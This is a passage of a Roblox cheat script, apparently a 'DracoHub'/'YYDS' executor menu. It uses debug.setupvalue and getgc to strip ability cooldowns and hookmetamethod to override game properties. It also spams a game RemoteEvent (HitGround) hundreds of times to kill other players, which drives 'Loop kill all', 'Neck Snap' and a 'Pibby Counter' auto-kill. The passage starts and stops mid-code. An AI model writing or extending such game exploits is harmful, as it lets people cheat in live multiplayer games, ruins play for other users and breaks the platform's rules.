	local env = getfenv(func)
	if env and env.script and env.script.Name == "Homelander" then
	table.insert(nocdCached, func)
	end
	end
	end
	end
	end
	if nocdChar then
	nocdChar:Disconnect()
	nocdChar = nil
	end
	nocdChar = LocalPlayer.CharacterAdded:Connect(function()
	task.wait(2)
	if not nocdOn then
	return
	end
	nocdCached = {}
	if typeof(getgc) == "function" then
	for _, func in pairs(getgc(true)) do
	if type(func) == "function" and islclosure(func) then
	local info = debug.getinfo(func)
	if info and info.name and nocdTargets[info.name] then
	local env = getfenv(func)
	if env and env.script and env.script.Name == "Homelander" then
	table.insert(nocdCached, func)
	end
	end
	end
	end
	end
	end)
	if nocdLoop then
	nocdLoop:Disconnect()
	nocdLoop = nil
	end
	nocdLoop = RunService.RenderStepped:Connect(function()
	if not nocdOn then
	return
	end
	for _, func in ipairs(nocdCached) do
	local okU, upvalues = pcall(debug.getupvalues, func)
	if okU and type(upvalues) == "table" then
	for i, value in pairs(upvalues) do
	if value == true then
	pcall(debug.setupvalue, func, i, false)
	end
	end
	end
	end
	end)
	else
	nocdBtn.Text = "nocd"
	nocdBtn.BackgroundColor3 = Color3.fromRGB(153, 153, 153)
	nocdCached = {}
	if nocdLoop then
	nocdLoop:Disconnect()
	nocdLoop = nil
	end
	if nocdChar then
	nocdChar:Disconnect()
	nocdChar = nil
	end
	if nocdHooked and nocdUI and nocdOldStart then
	pcall(function()
	nocdUI.Start = nocdOldStart
	end)
	nocdHooked = false
	end
	end
	end)
	end
	do
	pcall(function()
	if isfile and isfile("yyds_pcset_dev_v2.txt") then
	local raw = readfile("yyds_pcset_dev_v2.txt")
	raw = string.upper(tostring(raw or ""))
	raw = string.gsub(raw, "[^A-Z0-9]", "")
	raw = string.sub(raw, 1, 1)
	if raw ~= "" then
	LocalPlayer:SetAttribute("YYDSMenuBind", raw)
	end
	end
	end)
	if LocalPlayer:GetAttribute("YYDSMenuBind") == nil then
	LocalPlayer:SetAttribute("YYDSMenuBind", "U")
	end
	local icon = MinimizeIcon
	if icon and (not icon:FindFirstChild("PcHint")) then
	local hint = Instance.new("TextLabel")
	hint.Name = "PcHint"
	hint.Size = UDim2.new(1, 0, 0, 16)
	hint.Position = UDim2.new(0, 0, 1, -17)
	hint.BackgroundTransparency = 1
	hint.Font = Enum.Font.GothamBold
	hint.TextSize = 12
	hint.TextColor3 = Color3.fromRGB(153, 153, 153)
	hint.TextTransparency = 0.5
	hint.TextXAlignment = Enum.TextXAlignment.Center
	hint.TextYAlignment = Enum.TextYAlignment.Center
	hint.ZIndex = 21
	hint.Parent = icon
	local k0 = LocalPlayer:GetAttribute("YYDSMenuBind")
	if type(k0) ~= "string" or k0 == "" then
	k0 = "U"
	end
	hint.Text = string.upper(k0)
	hint.Visible = LocalPlayer:GetAttribute("YYDSPC") == true
	LocalPlayer:GetAttributeChangedSignal("YYDSPC"):Connect(function()
	local h = icon:FindFirstChild("PcHint")
	if h then
	h.Visible = LocalPlayer:GetAttribute("YYDSPC") == true
	end
	end)
	LocalPlayer:GetAttributeChangedSignal("YYDSMenuBind"):Connect(function()
	local h = icon:FindFirstChild("PcHint")
	if h then
	local k = LocalPlayer:GetAttribute("YYDSMenuBind")
	if type(k) ~= "string" or k == "" then
	k = "U"
	end
	h.Text = string.upper(k)
	end
	end)
	end
	local env = getgenv()
	if env._YYDSMenuMouseSaved == nil then
	env._YYDSMenuMouseSaved = {
	behavior = UIS.MouseBehavior,
	icon = UIS.MouseIconEnabled
	}
	end
	env._YYDSMenuMouseFree = false
	if hookmetamethod and (not env._YYDSMenuMouseHooked) then
	local wrap = newcclosure or function(f)
	return f
	end
	local okHook = pcall(function()
	local oldNew
	oldNew = hookmetamethod(game, "__newindex", wrap(function(self, key, value)
	if env._YYDSMenuMouseFree and self == UIS and key == "MouseBehavior" then
	if value ~= Enum.MouseBehavior.Default then
	value = Enum.MouseBehavior.Default
	end
	end
	return oldNew(self, key, value)
	end))
	end)
	if okHook then
	env._YYDSMenuMouseHooked = true
	end
	end
	local function yydsMenuMouse(open)
	if LocalPlayer:GetAttribute("YYDSPC") ~= true then
	env._YYDSMenuMouseFree = false
	return
	end
	if open then
	env._YYDSMenuMouseSaved = {
	behavior = UIS.MouseBehavior,
	icon = UIS.MouseIconEnabled
	}
	env._YYDSMenuMouseFree = true
	pcall(function()
	UIS.MouseBehavior = Enum.MouseBehavior.Default
	end)
	pcall(function()
	UIS.MouseIconEnabled = true
	end)
	else
	env._YYDSMenuMouseFree = false
	local saved = env._YYDSMenuMouseSaved
	pcall(function()
	UIS.MouseBehavior = (saved and saved.behavior) or Enum.MouseBehavior.LockCenter
	end)
	pcall(function()
	if saved then
	UIS.MouseIconEnabled = saved.icon
	end
	end)
	end
	end
	if Main.Visible then
	yydsMenuMouse(true)
	end
	RunService.Heartbeat:Connect(function()
	if env._YYDSMenuMouseFree then
	if UIS.MouseBehavior ~= Enum.MouseBehavior.Default then
	pcall(function()
	UIS.MouseBehavior = Enum.MouseBehavior.Default
	end)
	end
	if UIS.MouseIconEnabled ~= true then
	pcall(function()
	UIS.MouseIconEnabled = true
	end)
	end
	end
	end)
	MinusBtn.MouseButton1Click:Connect(function()
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	yydsMenuMouse(false)
	end
	end)
	MinimizeIcon.MouseButton1Click:Connect(function()
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	yydsMenuMouse(true)
	end
	end)
	LocalPlayer:GetAttributeChangedSignal("YYDSPC"):Connect(function()
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	if Main.Visible then
	yydsMenuMouse(true)
	end
	else
	yydsMenuMouse(false)
	end
	end)
	UIS.InputBegan:Connect(function(input, gp)
	if LocalPlayer:GetAttribute("YYDSPC") ~= true then
	return
	end
	if input.UserInputType ~= Enum.UserInputType.Keyboard then
	return
	end
	if UIS:GetFocusedTextBox() then
	return
	end
	local k = LocalPlayer:GetAttribute("YYDSMenuBind")
	if type(k) ~= "string" or k == "" then
	k = "U"
	end
	k = string.upper(k)
	if input.KeyCode.Name ~= k then
	return
	end
	if Main.Visible then
	Main.Visible = false
	MinimizeIcon.Visible = true
	yydsMenuMouse(false)
	else
	Main.Visible = true
	MinimizeIcon.Visible = false
	yydsMenuMouse(true)
	end
	end)
	end
	do
	local neckBusy = false
	local fg0 = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	if fg0 and (not fg0:FindFirstChild("NeckSnap")) then
	local b = Instance.new("TextButton")
	b.Name = "NeckSnap"
	b.Size = UDim2.new(0, 60, 0, 60)
	b.Position = UDim2.new(1, -310, 0.5, -100)
	b.BackgroundColor3 = Color3.fromRGB(180, 30, 30)
	b.TextColor3 = Color3.fromRGB(255, 255, 255)
	b.Font = Enum.Font.GothamBold
	b.Text = "Neck Snap"
	b.TextScaled = true
	b.TextWrapped = true
	b.Visible = false
	b.ZIndex = 20
	b.Parent = fg0
	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, 8)
	c.Parent = b
	end
	task.spawn(function()
	while true do
	local fg = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local neck = fg and fg:FindFirstChild("NeckSnap")
	if neck then
	local stalk = fg:FindFirstChild("Stalk")
	local tb = fg:FindFirstChild("TerrorBlade")
	local mm = fg:FindFirstChild("MMLifeInsure")
	local stab = fg:FindFirstChild("MyersStab")
	local otherOn = homelanderModActive or aTrainModActive or kiraAim
	local hbO = Page2Scroll:FindFirstChild("HealRegenModBtn")
	if hbO and hbO:GetAttribute("On") == true then
	otherOn = true
	end
	if otherOn then
	if stalk then stalk.Visible = false end
	if tb then tb.Visible = false end
	if stab then stab.Visible = false end
	if neck then neck.Visible = false end
	if mm then
	mm.Visible = false
	local mb = mm:FindFirstChild("MmBar")
	if mb then mb.Visible = false end
	end
	end
	local myersOn = (not otherOn) and ((stalk and stalk.Visible) or (tb and tb.Visible) or (mm and mm.Visible) or (stab and stab.Visible))
	local restricted = LocalPlayer:GetAttribute("YYDSStalkMode") == true
	local pc = LocalPlayer:GetAttribute("YYDSPC") == true
	if restricted and (not otherOn) then
	if pc then
	if mm then
	mm.Visible = true
	if mm.Position.X.Offset ~= -192 or mm.Position.Y.Offset ~= -96 then
	mm.Size = UDim2.new(0, 44, 0, 44)
	mm.Position = UDim2.new(0.5, -192, 1, -96)
	end
	local mmArr = mm:FindFirstChild("MmArrow")
	if mmArr then
	mmArr.Size = UDim2.new(1, 0, 0, 16)
	mmArr.Position = UDim2.new(0, 0, 0, -18)
	mmArr.Text = "^"
	end
	end
	if stab and stab.Visible == true then
	stab.Size = UDim2.new(0, 44, 0, 44)
	stab.Position = UDim2.new(0.5, -36, 1, -96)
	end
	local ch = stalk:FindFirstChild("PcHint")
	if not ch then
	ch = Instance.new("TextLabel")
	ch.Name = "PcHint"
	ch.Size = UDim2.new(1, 0, 0, 12)
	ch.Position = UDim2.new(0, 0, 1, -6)
	ch.BackgroundTransparency = 1
	ch.Font = Enum.Font.GothamBold
	ch.TextSize = 11
	ch.TextColor3 = Color3.fromRGB(230, 230, 230)
	ch.Text = "C"
	ch.Parent = stalk
	end
	ch.Visible = stalk.Visible == true
	local cancel = stalk:FindFirstChild("StalkCancel")
	if cancel then
	local rh = cancel:FindFirstChild("PcHint")
	if not rh then
	rh = Instance.new("TextLabel")
	rh.Name = "PcHint"
	rh.Size = UDim2.new(1, 0, 0, 12)
	rh.Position = UDim2.new(0, 0, 1, -6)
	rh.BackgroundTransparency = 1
	rh.Font = Enum.Font.GothamBold
	rh.TextSize = 11
	rh.TextColor3 = Color3.fromRGB(230, 230, 230)
	rh.Text = "R"
	rh.Parent = cancel
	end
	rh.Visible = cancel.Visible == true
	end
	local nh = neck:FindFirstChild("PcHint")
	if not nh then
	nh = Instance.new("TextLabel")
	nh.Name = "PcHint"
	nh.Size = UDim2.new(1, 0, 0, 12)
	nh.Position = UDim2.new(0, 0, 1, -6)
	nh.BackgroundTransparency = 1
	nh.Font = Enum.Font.GothamBold
	nh.TextSize = 11
	nh.TextColor3 = Color3.fromRGB(230, 230, 230)
	nh.Parent = neck
	end
	local mcan, mnb = "R", "B"
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "M:([A-Z0-9,]+)")
	if body then
	local vals = {}
	local n = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	n = n + 1
	vals[n] = tok
	end
	if vals[7] then mcan = vals[7] end
	if vals[8] then mnb = vals[8] end
	end
	end
	end)
	nh.Text = mnb
	nh.Visible = neck.Visible == true
	if rh then
	rh.Text = mcan
	end
	end
	local stabNow = fg:FindFirstChild("MyersStab")
	local gunNow = fg:FindFirstChild("DeadpoolSkill")
	if stabNow then
	neck.Size = stabNow.Size
	neck.Position = stabNow.Position
	elseif gunNow then
	neck.Size = gunNow.Size
	neck.Position = gunNow.Position
	else
	neck.Size = UDim2.new(0, 60, 0, 30)
	neck.Position = UDim2.new(1, -240, 0.5, -100)
	end
	elseif pc and (not otherOn) then
	if neck.Position.X.Offset ~= -140 or neck.Position.Y.Offset ~= -96 then
	neck.Size = UDim2.new(0, 44, 0, 44)
	neck.Position = UDim2.new(0.5, -140, 1, -96)
	end
	if mm and (myersOn or mm.Visible) then
	mm.Visible = true
	if mm.Position.X.Offset ~= -192 or mm.Position.Y.Offset ~= -96 then
	mm.Size = UDim2.new(0, 44, 0, 44)
	mm.Position = UDim2.new(0.5, -192, 1, -96)
	end
	local mmArr = mm:FindFirstChild("MmArrow")
	if mmArr then
	mmArr.Size = UDim2.new(1, 0, 0, 16)
	mmArr.Position = UDim2.new(0, 0, 0, -18)
	mmArr.Text = "^"
	end
	end
	if stab and (not restricted) and (stab.Position.X.Offset ~= -88 or stab.Position.Y.Offset ~= -96) then
	stab.Size = UDim2.new(0, 44, 0, 44)
	stab.Position = UDim2.new(0.5, -88, 1, -96)
	end
	if tb and tb.Visible and (tb.Position.X.Offset ~= -36 or tb.Position.Y.Offset ~= -96) then
	tb.Size = UDim2.new(0, 44, 0, 44)
	tb.Position = UDim2.new(0.5, -36, 1, -96)
	end
	if myersOn and (not restricted) and neck.Visible ~= true then
	neck.Visible = true
	end
	local mx, mn, mc, mv = "X", "R", "C", "V"
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "M:([A-Z0-9,]+)")
	if body then
	local vals = {}
	local n = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	n = n + 1
	vals[n] = tok
	end
	if vals[2] then mx = vals[2] end
	if vals[4] then mn = vals[4] end
	if vals[5] then mc = vals[5] end
	if vals[6] then mv = vals[6] end
	end
	end
	end)
	local marks = {
	{mm, mx},
	{neck, mn},
	{stab, mc},
	{tb, mv}
	}
	for _, pair in ipairs(marks) do
	local b, letter = pair[1], pair[2]
	if b then
	local h = b:FindFirstChild("PcHint")
	if not h then
	h = Instance.new("TextLabel")
	h.Name = "PcHint"
	h.Size = UDim2.new(1, 0, 0, 12)
	h.Position = UDim2.new(0, 0, 1, -6)
	h.BackgroundTransparency = 1
	h.Font = Enum.Font.GothamBold
	h.TextSize = 11
	h.TextColor3 = Color3.fromRGB(230, 230, 230)
	h.Parent = b
	end
	h.Text = letter
	h.Visible = b.Visible == true
	end
	end
	if mm then
	local bar = mm:FindFirstChild("MmBar")
	local modeBtn = bar and bar:FindFirstChild("StalkModeBtn")
	if modeBtn then
	local th = modeBtn:FindFirstChild("PcHint")
	if not th then
	th = Instance.new("TextLabel")
	th.Name = "PcHint"
	th.Size = UDim2.new(1, 0, 0, 12)
	th.Position = UDim2.new(0, 0, 1, 0)
	th.BackgroundTransparency = 1
	th.Font = Enum.Font.GothamBold
	th.TextSize = 11
	th.TextColor3 = Color3.fromRGB(230, 230, 230)
	th.Text = "T"
	th.Parent = modeBtn
	end
	th.Visible = true
	end
	local ar = mm:FindFirstChild("MmArrow")
	if ar then
	local zh = ar:FindFirstChild("PcHint")
	if not zh then
	zh = Instance.new("TextLabel")
	zh.Name = "PcHint"
	zh.Size = UDim2.new(1, 0, 0, 12)
	zh.Position = UDim2.new(0, 0, 0, -12)
	zh.BackgroundTransparency = 1
	zh.Font = Enum.Font.GothamBold
	zh.TextSize = 11
	zh.TextColor3 = Color3.fromRGB(230, 230, 230)
	zh.Text = "Z"
	zh.Parent = ar
	end
	zh.Visible = ar.Visible == true
	end
	end
	else
	if restricted then
	neck.Size = UDim2.new(0, 60, 0, 30)
	neck.Position = UDim2.new(1, -240, 0.5, -100)
	else
	neck.Size = UDim2.new(0, 60, 0, 60)
	neck.Position = UDim2.new(1, -310, 0.5, -100)
	end
	if mm then
	if myersOn or neck.Visible or (stab and stab.Visible) or (tb and tb.Visible) or (stalk and stalk.Visible) then
	mm.Visible = true
	mm.ZIndex = 20
	end
	mm.Size = UDim2.new(0, 60, 0, 30)
	mm.Position = UDim2.new(1, -240, 0.5, -156)
	local mmArr = mm:FindFirstChild("MmArrow")
	if mmArr then
	mmArr.Size = UDim2.new(0, 16, 1, 0)
	mmArr.Position = UDim2.new(1, 2, 0, 0)
	mmArr.Text = ">"
	local zh = mmArr:FindFirstChild("PcHint")
	if zh then
	zh.Visible = false
	end
	end
	local mmBar = mm:FindFirstChild("MmBar")
	if mmBar then
	mmBar.Position = UDim2.new(1, 2, 0.5, -18)
	end
	end
	if stab and stab.Visible then
	stab.Size = UDim2.new(0, 60, 0, 30)
	stab.Position = UDim2.new(1, -240, 0.5, -100)
	end
	if tb and tb.Visible then
	tb.Size = UDim2.new(0, 60, 0, 60)
	tb.Position = DEFAULT_POSITIONS.MoAim
	end
	if stalk and stalk.Visible then
	stalk.Size = UDim2.new(0, 60, 0, 60)
	stalk.Position = DEFAULT_POSITIONS.MoAim
	end
	local h = neck:FindFirstChild("PcHint")
	if h then h.Visible = false end
	if mm then
	local h2 = mm:FindFirstChild("PcHint")
	if h2 then h2.Visible = false end
	end
	if stab then
	local h3 = stab:FindFirstChild("PcHint")
	if h3 then h3.Visible = false end
	end
	if tb then
	local h4 = tb:FindFirstChild("PcHint")
	if h4 then h4.Visible = false end
	end
	end
	if neck:GetAttribute("Hooked") ~= true then
	neck:SetAttribute("Hooked", true)
	neck.MouseButton1Click:Connect(function()
	if neckBusy then return end
	if neck.Visible ~= true then return end
	neckBusy = true
	local remote = nil
	local charsFolder = ReplicatedStorage:FindFirstChild("Characters")
	if charsFolder then
	for _, folder in ipairs(charsFolder:GetChildren()) do
	if string.lower(folder.Name):find("myers") then
	local remotesFolder = folder:FindFirstChild("Remotes")
	local hit = remotesFolder and remotesFolder:FindFirstChild("ChokeThrow")
	if hit and hit:IsA("RemoteEvent") then
	remote = hit
	break
	end
	end
	end
	end
	if not remote then
	neckBusy = false
	neck.Text = "No Remote"
	task.delay(1.2, function()
	if neck then
	neck.Text = "Neck Snap"
	end
	end)
	return
	end
	pcall(function()
	remote:FireServer()
	end)
	neck.Text = "Neck Snap"
	local char = LocalPlayer.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	local animator = hum and (hum:FindFirstChildOfClass("Animator") or hum)
	local caught = false
	local conn = nil
	if animator then
	conn = animator.AnimationPlayed:Connect(function(track)
	if caught then return end
	if not track or not track.Animation then return end
	local id = string.gsub(tostring(track.Animation.AnimationId), "[^%d]", "")
	if id ~= "137378190977269" then return end
	caught = true
	if conn then conn:Disconnect() end
	local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	local marked, bestDist = nil, 9999
	if myRoot then
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer and plr.Character then
	local r = plr.Character:FindFirstChild("HumanoidRootPart")
	local h = plr.Character:FindFirstChildOfClass("Humanoid")
	if r and h and h.Health > 0 then
	local d = (r.Position - myRoot.Position).Magnitude
	if d < bestDist then marked, bestDist = plr, d end
	end
	end
	end
	end
	if not marked then return end
	task.spawn(function()
	task.wait(1.5)
	if not marked.Character then return end
	local hum2 = marked.Character:FindFirstChildOfClass("Humanoid")
	if not hum2 or hum2.Health <= 0 then return end
	local hitG = nil
	pcall(function()
	hitG = ReplicatedStorage.Characters.Homelander.Remotes.HitGround
	end)
	if not hitG then return end
	local ch0 = marked.Character
	for _ = 1, 500 do
	pcall(function()
	hitG:FireServer(marked.DisplayName)
	hitG:FireServer(marked.Name)
	hitG:FireServer(ch0)
	end)
	end
	local endTime = tick() + 20
	while tick() < endTime do
	local c = marked.Character
	if not c then break end
	local hh = c:FindFirstChildOfClass("Humanoid")
	if (not hh) or hh.Health <= 0 then break end
	pcall(function()
	hitG:FireServer(marked.DisplayName)
	hitG:FireServer(marked.Name)
	hitG:FireServer(c)
	end)
	task.wait(0.05)
	end
	end)
	end)
	end
	task.delay(2, function()
	if conn then conn:Disconnect() end
	end)
	neckBusy = false
	end)
	end
	end
	task.wait(0.2)
	end
	end)
	end
	do
	local loopBtn = Instance.new("TextButton")
	loopBtn.Size = UDim2.new(0.5, -8, 0, 24)
	loopBtn.Position = UDim2.new(0.5, 2, 0, 214)
	loopBtn.BackgroundColor3 = Color3.fromRGB(120, 20, 20)
	loopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	loopBtn.Font = Enum.Font.GothamBold
	loopBtn.TextSize = 10
	loopBtn.Text = "Loop kill all"
	loopBtn.TextScaled = true
	loopBtn.Parent = Page2Scroll
	local loopCorner = Instance.new("UICorner")
	loopCorner.CornerRadius = UDim.new(0, 4)
	loopCorner.Parent = loopBtn
	loopBtn.MouseButton1Click:Connect(function()
	if killAllActive then
	killAllActive = false
	loopBtn.Text = "Loop kill all"
	loopBtn.BackgroundColor3 = Color3.fromRGB(120, 20, 20)
	return
	end
	killAllActive = true
	loopBtn.Text = "Loop ON"
	loopBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
	task.spawn(function()
	while killAllActive do
	local remote = ReplicatedStorage.Characters.Homelander.Remotes.HitGround
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer then
	remote:FireServer(plr.DisplayName)
	remote:FireServer(plr.Name)
	remote:FireServer(plr.Character)
	end
	end
	task.wait(0.05)
	end
	end)
	end)
	end
	do
	-- Pibby Counter（一鍵釋放 + 3 秒擊殺）全部 local 只活在這個 do 裡
	local pibbyMarked = nil
	local pibbyMarker = nil
	local pibbyKillThread = nil
	local pibbyAnimConn = nil
	local PIBBY_ANIM = "117200689830889"
	local PIBBY_RANGE = 4
	local PIBBY_DELAY = 3.0
	local PIBBY_BURST = 500
	local PIBBY_CHASE = 20
	task.spawn(function()
	local function attachPibbyAnim(char)
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 5)
	if not hum then return end
	local animator = hum:FindFirstChildOfClass("Animator") or hum:WaitForChild("Animator", 5)
	if not animator then return end
	if pibbyAnimConn then pibbyAnimConn:Disconnect() end
	pibbyAnimConn = animator.AnimationPlayed:Connect(function(track)
	if not track or not track.Animation then return end
	local id = string.gsub(tostring(track.Animation.AnimationId), "[^%d]", "")
	if id ~= PIBBY_ANIM then return end
	local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not myRoot then return end
	local best, bestDist = nil, PIBBY_RANGE
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer and plr.Character then
	local r = plr.Character:FindFirstChild("HumanoidRootPart")
	local h = plr.Character:FindFirstChildOfClass("Humanoid")
	if r and h and h.Health > 0 then
	local d = (r.Position - myRoot.Position).Magnitude
	if d <= bestDist then best, bestDist = plr, d end
	end
	end
	end
	if not best then return end
	pibbyMarked = best
	if pibbyKillThread then task.cancel(pibbyKillThread) end
	pibbyKillThread = task.spawn(function()
	task.wait(PIBBY_DELAY)
	local t = pibbyMarked
	if not t or not t.Character then
	pibbyMarked = nil
	return
	end
	local hum2 = t.Character:FindFirstChildOfClass("Humanoid")
	if not hum2 or hum2.Health <= 0 then
	pibbyMarked = nil
	return
	end
	local hitG = nil
	pcall(function()
	hitG = ReplicatedStorage.Characters.Homelander.Remotes.HitGround
	end)
	if not hitG then
	local chars = ReplicatedStorage:FindFirstChild("Characters")
	if chars then
	for _, f in ipairs(chars:GetChildren()) do
	if string.lower(f.Name) == "homelander" then
	local kr = f:FindFirstChild("Remotes")
	hitG = kr and kr:FindFirstChild("HitGround")
	break
	end
	end
	end
	end
	if hitG then
	local ch0 = t.Character
	for _ = 1, PIBBY_BURST do
	pcall(function()
	hitG:FireServer(t.DisplayName)
	hitG:FireServer(t.Name)
	hitG:FireServer(ch0)
	end)
	end
	local endT = tick() + PIBBY_CHASE
	while tick() < endT do
	local c = t.Character
	if not c then break end
	local h3 = c:FindFirstChildOfClass("Humanoid")
	if not h3 or h3.Health <= 0 then break end
	pcall(function()
	hitG:FireServer(t.DisplayName)
	hitG:FireServer(t.Name)
	hitG:FireServer(c)
	end)
	task.wait(0.05)
	end
	end
	pibbyMarked = nil
	end)
	end)
	end
	if LocalPlayer.Character then attachPibbyAnim(LocalPlayer.Character) end
	LocalPlayer.CharacterAdded:Connect(function(char)
	task.wait(0.3)
	attachPibbyAnim(char)
	end)
	end)
	local fg = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	if fg and (not fg:FindFirstChild("HomeExtra")) then
	local b = Instance.new("TextButton")
	b.Name = "HomeExtra"
	b.Size = UDim2.new(0, 60, 0, 30)
	b.Position = UDim2.new(1, -240, 0.5, -138)
	b.BackgroundColor3 = Color3.fromRGB(120, 30, 30)
	b.TextColor3 = Color3.fromRGB(255, 255, 255)
	b.Font = Enum.Font.GothamBold
	b.Text = "Tear"
	b.TextScaled = true
	b.TextWrapped = true
	b.Visible = false
	b.Parent = fg
	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, 8)
	c.Parent = b
	end
	task.spawn(function()
	while true do
	local fg2 = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local extra = fg2 and fg2:FindFirstChild("HomeExtra")
	if extra then
	local pc = LocalPlayer:GetAttribute("YYDSPC") == true
	local hz = extra:FindFirstChild("PcHint")
	if not hz then
	hz = Instance.new("TextLabel")
	hz.Name = "PcHint"
	hz.Size = UDim2.new(1, 0, 0, 12)
	hz.Position = UDim2.new(0, 0, 1, -6)
	hz.BackgroundTransparency = 1
	hz.Font = Enum.Font.GothamBold
	hz.TextSize = 11
	hz.TextColor3 = Color3.fromRGB(230, 230, 230)
	hz.Text = "Z"
	hz.Parent = extra
	end
	local hzL = extra:GetAttribute("BindZ") or "Z"
	local hxL = extra:GetAttribute("BindX") or "X"
	local hcL = extra:GetAttribute("BindC") or "C"
	local hvL = extra:GetAttribute("BindV") or "V"
	local hbL = extra:GetAttribute("BindB") or "B"
	local lastRead = extra:GetAttribute("BindRead") or 0
	if tick() - lastRead > 1 then
	extra:SetAttribute("BindRead", tick())
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "H:([A-Z0-9,]+)")
	if body then
	local vals = {}
	local n = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	n = n + 1
	vals[n] = tok
	end
	if vals[1] then hzL = vals[1] end
	if vals[2] then hxL = vals[2] end
	if vals[3] then hcL = vals[3] end
	if vals[4] then hvL = vals[4] end
	if vals[5] then hbL = vals[5] end
	end
	end
	end)
	extra:SetAttribute("BindZ", hzL)
	extra:SetAttribute("BindX", hxL)
	extra:SetAttribute("BindC", hcL)
	extra:SetAttribute("BindV", hvL)
	extra:SetAttribute("BindB", hbL)
	end
	if hz.Text ~= hzL then
	hz.Text = hzL
	end
	local hzOn = pc and extra.Visible == true
	if hz.Visible ~= hzOn then
	hz.Visible = hzOn
	end
	local hintPair = {
	{FlashstrikeButton, hxL},
	{LaserButton, hcL},
	{KickButton, hvL},
	{UpthrowButton, hbL}
	}
	for _, pair in ipairs(hintPair) do
	local b, letter = pair[1], pair[2]
	if b then
	local h = b:FindFirstChild("PcHint")
	if not h then
	h = Instance.new("TextLabel")
	h.Name = "PcHint"
	h.Size = UDim2.new(1, 0, 0, 12)
	h.Position = UDim2.new(0, 0, 1, -6)
	h.BackgroundTransparency = 1
	h.Font = Enum.Font.GothamBold
	h.TextSize = 11
	h.TextColor3 = Color3.fromRGB(230, 230, 230)
	h.Parent = b
	end
	if h.Text ~= letter then
	h.Text = letter
	end
	h.Visible = pc and b.Visible == true
	end
	end
	local liWv = fg2 and fg2:FindFirstChild("LifeInsure")
	if liWv and liWv.Visible and liWv:GetAttribute("IsWolverine") == true then
	local wv, wr = extra:GetAttribute("BindWV") or "V", extra:GetAttribute("BindWR") or "R"
	if tick() - (extra:GetAttribute("BindWRead") or 0) > 1 then
	extra:SetAttribute("BindWRead", tick())
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "W:([A-Z0-9,]+)")
	if body then
	local vals = {}
	local n = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	n = n + 1
	vals[n] = tok
	end
	if vals[1] then wv = vals[1] end
	if vals[2] then wr = vals[2] end
	end
	end
	end)
	extra:SetAttribute("BindWV", wv)
	extra:SetAttribute("BindWR", wr)
	end
	local h = liWv:FindFirstChild("PcHint")
	if not h then
	h = Instance.new("TextLabel")
	h.Name = "PcHint"
	h.Size = UDim2.new(1, 0, 0, 12)
	h.Position = UDim2.new(0, 0, 1, -6)
	h.BackgroundTransparency = 1
	h.Font = Enum.Font.GothamBold
	h.TextSize = 11
	h.TextColor3 = Color3.fromRGB(230, 230, 230)
	h.Parent = liWv
	end
	if h.Text ~= wv then
	h.Text = wv
	end
	h.Visible = pc and true
	local rh = liWv:FindFirstChild("LiRHint")
	if rh and rh.Text ~= wr then
	rh.Text = wr
	end
	end
	local gunNow = fg2 and fg2:FindFirstChild("DeadpoolSkill")
	if gunNow and gunNow.Visible then
	local dx, dc, dv, dr = extra:GetAttribute("BindDX") or "X", extra:GetAttribute("BindDC") or "C", extra:GetAttribute("BindDV") or "V", extra:GetAttribute("BindDR") or "R"
	if tick() - (extra:GetAttribute("BindDRead") or 0) > 1 then
	extra:SetAttribute("BindDRead", tick())
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "D:([A-Z0-9,]+)")
	if body then
	local vals = {}
	local n = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	n = n + 1
	vals[n] = tok
	end
	if vals[1] then dx = vals[1] end
	if vals[2] then dc = vals[2] end
	if vals[3] then dv = vals[3] end
	if vals[4] then dr = vals[4] end
	end
	end
	end)
	extra:SetAttribute("BindDX", dx)
	extra:SetAttribute("BindDC", dc)
	extra:SetAttribute("BindDV", dv)
	extra:SetAttribute("BindDR", dr)
	end
	local sl = LocalPlayer.PlayerGui:FindFirstChild("DracoHubShootLayer")
	local shootNow = sl and sl:FindFirstChild("DeadpoolShoot")
	local liNow = fg2 and fg2:FindFirstChild("LifeInsure")
	local dHints = {
	{gunNow, dx},
	{shootNow, dc},
	{liNow, dv}
	}
	for _, pair in ipairs(dHints) do
	local b, letter = pair[1], pair[2]
	if b then
	local h = b:FindFirstChild("PcHint")
	if not h then
	h = Instance.new("TextLabel")
	h.Name = "PcHint"
	h.Size = UDim2.new(1, 0, 0, 12)
	h.Position = UDim2.new(0, 0, 1, -6)
	h.BackgroundTransparency = 1
	h.Font = Enum.Font.GothamBold
